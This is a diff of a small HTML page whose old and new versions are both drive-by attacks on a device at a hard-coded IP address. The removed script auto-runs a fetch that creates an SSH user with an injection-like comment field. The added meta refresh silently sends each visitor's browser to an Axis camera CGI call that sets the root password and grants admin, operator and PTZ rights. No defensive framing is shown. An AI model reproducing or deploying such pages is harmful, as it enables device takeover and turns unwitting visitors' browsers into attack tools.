@@ -1,66 +1,13 @@
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Auto Execute cURL</title>
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="0; URL=https://85.235.16.23/axis-cgi/pwdgrp.cgi?action=update&user=root&pwd=king%40aA1&sgrp=viewer%3Aoperator%3Aadmin%3Aptz">
+    <title>Redirecting...</title>
 </head>
 <body>
-
-  <script>
-    // Define the cURL command as a JavaScript object
-    var curlCommand = {
-      method: 'POST',
-      url: 'https://85.235.16.23/config/rest/ssh/v1/users',
-      headers: {
-        'accept': 'application/json',
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        data: {
-          comment: '*6\\"WeYJxzhiTQqA~=d`OkObqj8y6%A.xM+=PG\\"Fs.EQhU`%-O@0\'\\\'\'',
-          password: 'string',
-          username: 'fjyhf7k8yo1128h-e88gklh3g_mocdr3'
-        }
-      })
-    };
-
-    // Convert the JavaScript object to a cURL command string
-    function convertToCurlCommand(curlObj) {
-      var curlStr = 'curl';
-      curlStr += ' -X \'' + curlObj.method.toUpperCase() + '\'';
-      curlStr += ' \'' + curlObj.url + '\'';
-
-      // Add headers
-      for (var header in curlObj.headers) {
-        curlStr += ' -H \'' + header + ': ' + curlObj.headers[header] + '\'';
-      }
-
-      // Add body if exists
-      if (curlObj.body) {
-        curlStr += ' -d \'' + curlObj.body.replace(/'/g, "\\'") + '\'';
-      }
-
-      return curlStr;
-    }
-
-    // Execute the cURL command using Fetch API
-    fetch(curlCommand.url, {
-      method: curlCommand.method,
-      headers: curlCommand.headers,
-      body: curlCommand.body
-    })
-    .then(response => response.json())
-    .then(data => {
-      console.log('Response:', data);
-    })
-    .catch(error => {
-      console.error('Error:', error);
-    });
-
-    console.log('Executing cURL command:', convertToCurlCommand(curlCommand));
-  </script>
-
+    <!-- This page will redirect automatically -->
 </body>
 </html>
-
